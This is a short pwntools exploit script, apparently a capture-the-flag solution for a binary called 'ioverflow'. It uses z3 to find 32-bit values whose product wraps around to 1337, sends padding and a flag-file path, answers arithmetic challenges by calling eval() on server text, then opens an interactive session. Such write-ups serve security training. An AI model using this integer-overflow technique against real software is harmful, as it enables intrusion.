#!/usr/bin/env python

from pwn import *
import sys, z3



def exploit(r):

	s = z3.Solver()

	x = z3.BitVec('x', 32)
	y = z3.BitVec('y', 32)

	s.add(x > 1337)
	s.add(y > 1)

	s.add(x * y == 1337)
	if s.check() == z3.unsat:
		print "Unsat"
		return
	else:
		m = s.model()


	r.sendlineafter(' : ', "A"*99)

	r.sendlineafter(' : ', './flag.txt')

	r.recvuntil('CHALLEGEN 1: ')
	c1 = r.recvuntil(' = ', drop=True)
	c1 = eval(c1)
	if c1 < 0x80000000:
		r.sendline(str(c1))
	else:
		r.sendline('-' + str(-c1& 0xffffffff))

	r.recvuntil('CHALLEGEN 2: ')
	c1 = r.recvuntil(' = ', drop=True)
	c1 = eval(c1)
	if c1 < 0x80000000:
		r.sendline(str(c1))
	else:
		r.sendline('-' + str(-c1& 0xffffffff))

	r.sendlineafter('x = ', str(m[x].as_long()) )
	r.sendlineafter('y = ', str(m[y].as_long()) )

	r.interactive()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['./ioverflow'], env={"LD_PRELOAD":"./libcrypto.so.1.1"})
        print util.proc.pidof(r)
        pause()
        exploit(r)